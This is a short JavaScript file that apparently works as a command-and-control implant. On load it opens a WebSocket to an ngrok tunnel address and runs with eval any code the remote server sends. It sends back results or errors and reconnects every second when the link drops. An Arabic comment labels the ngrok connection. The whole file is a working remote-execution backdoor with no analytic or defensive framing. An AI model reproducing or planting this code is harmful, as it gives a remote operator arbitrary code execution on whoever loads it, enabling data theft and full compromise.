globalThis.startC2 = () => {
    if (globalThis.socket) return;

    // اتصالك عبر نغروك
    const socket = new WebSocket(`wss://noneducable-exigently-emelia.ngrok-free.dev`);
    globalThis.socket = socket;

    socket.onmessage = ({ data }) => {
        const { type, code } = JSON.parse(data);
        if (type === "eval") {
            try {
                const returned = eval(code);
                socket.send(JSON.stringify({ type: "result", value: String(returned) }));
            } catch (e) {
                socket.send(JSON.stringify({ type: "error", value: e.message }));
            }
        }
    };

    socket.onclose = () => {
        globalThis.socket = undefined;
        setTimeout(() => globalThis.startC2(), 1000);
    };
};

globalThis.startC2();
